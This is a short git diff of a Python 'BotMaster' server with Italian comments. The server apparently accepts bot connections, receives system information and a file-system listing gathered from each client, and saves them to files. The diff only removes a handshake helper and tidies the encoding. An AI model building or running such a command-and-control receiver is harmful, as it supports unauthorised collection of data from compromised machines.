@@ -31,25 +31,7 @@ class BotMaster:
         self.waitForClient()
 
 
-    def waitForHeader(self, connection):
-        """
-        Procedura nella quale il server riceve la dimensione dell'header del pacchetto che conterrà dati rilevanti.
-        :return: None
-        """
 
-        # Il client invia al server la dimensione dei dati raccolti ( da sostituire poi al parametro HEADER per la recv() ).
-        data_dim = 0
-        while data_dim == 0:
-            data_dim = int(connection.recv(1024).decode(FORMAT))
-
-        # Il server manderà una riposta al client per confermare la corretta ricevuta della dimensione dei dati.
-        message_received = SUCCESSFUL_RESPONSE
-        # Comunica direttamente sulla socket del client.
-        connection.sendall(message_received.encode(FORMAT))
-
-        print("System Information Header dimension received: ", data_dim)
-
-        return data_dim
 
     def waitForClient(self):
         """
@@ -60,9 +42,6 @@ class BotMaster:
             connection, addr = self.serverSocket.accept()
             print('The connection has been accepted! Client ip address: ', addr[0])
 
-            #data_dim = self.waitForHeader(connection)
-            #print("data dimension= " + str(data_dim))
-            #data = connection.recv(data_dim).decode(FORMAT)
 
             data = self.recv_msg(connection).decode(FORMAT)
 
@@ -72,12 +51,9 @@ class BotMaster:
             with open('data.json', 'w') as fp:
                 json.dump(dict, fp, indent=4)
 
-            # Il server aspetta il secondo header, quello relativo al retrieval del file system.
-            #data_dim = self.waitForHeader(connection)
 
-            #data = connection.recv(data_dim).decode(FORMAT)
             data = self.recv_msg(connection).decode(FORMAT)
-            with open('fileSystem.txt', 'w', encoding="utf-8") as fp:
+            with open('fileSystem.txt', 'w', encoding=FORMAT) as fp:
                 fp.write(data)
 
             connection.close()
